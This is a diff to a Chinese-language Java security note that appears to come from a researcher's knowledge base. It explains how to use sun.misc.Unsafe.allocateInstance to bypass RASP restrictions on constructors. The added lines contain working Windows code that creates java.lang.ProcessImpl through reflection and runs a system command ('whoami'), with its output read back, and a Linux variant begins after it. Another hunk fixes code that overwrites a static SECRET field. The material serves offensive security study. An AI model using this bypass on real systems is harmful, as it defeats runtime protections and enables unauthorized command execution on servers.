@@ -5,7 +5,9 @@
 `Unsafe`是Java内部API，不允许外部调用
 
 ```java
+/*
 A collection of methods for performing low-level, unsafe operations. Although the class and all methods are public, use of this class is limited because only trusted code can obtain instances of it.
+*/
 public final class Unsafe {
     private Unsafe() {}
 
@@ -35,13 +37,46 @@ Unsafe unsafe = (Unsafe) getUnsafe.get(null);
 
 # allocateInstance
 
-若RASP限制了某些类的构造方法
+若RASP限制了某些类的构造方法（比如`TrAXFilter`（加载字节码）、`ProcessImpl`（Windows命令执行）、`UnixProcess`（Linux命令执行））
 
 可以用`Unsafe`的`allocateInstance`方法绕过这个限制
 
 Google的`GSON`库在JSON反序列化的时候就使用这个方式来创建类实例
 
 ![image-20230506135841815](../.gitbook/assets/image-20230506135841815.png)
+
+绕过命令执行限制
+
+Windows版本：
+
+```java
+Class<?> clazz = Class.forName("sun.misc.Unsafe");
+Field field = clazz.getDeclaredField("theUnsafe");
+field.setAccessible(true);
+Unsafe unsafe = (Unsafe) field.get(null);
+Class<?> processImpl = Class.forName("java.lang.ProcessImpl");
+Process process = (Process) unsafe.allocateInstance(processImpl);
+Method create = processImpl.getDeclaredMethod("create", String.class, String.class, String.class, long[].class, boolean.class);
+create.setAccessible(true);
+long[] stdHandles = new long[]{-1L, -1L, -1L};
+create.invoke(process, "whoami", null, null, stdHandles, false);
+
+JavaIOFileDescriptorAccess fdAccess
+    = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();
+FileDescriptor stdout_fd = new FileDescriptor();
+fdAccess.setHandle(stdout_fd, stdHandles[1]);
+InputStream inputStream = new BufferedInputStream(
+    new FileInputStream(stdout_fd));
+
+BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+
+String line;
+while ((line = reader.readLine()) != null) {
+    System.out.println(line);
+}
+```
+
+Linux版本：
 
 ```java
 String cmd = "whoami";
@@ -129,7 +164,7 @@ unsafe.putObject(unsafeTest, unsafe.objectFieldOffset(cmd), "calc");
 System.out.println(unsafeTest.getCmd());
 
 Field secret = test.getDeclaredField("SECRET");
-unsafe.putObject(unsafeTest, unsafe.staticFieldOffset(secret), "hacked");
+unsafe.putObject(unsafeTest.getClass(), unsafe.staticFieldOffset(secret), "hacked");
 System.out.println(unsafeTest.SECRET);
 ```
 
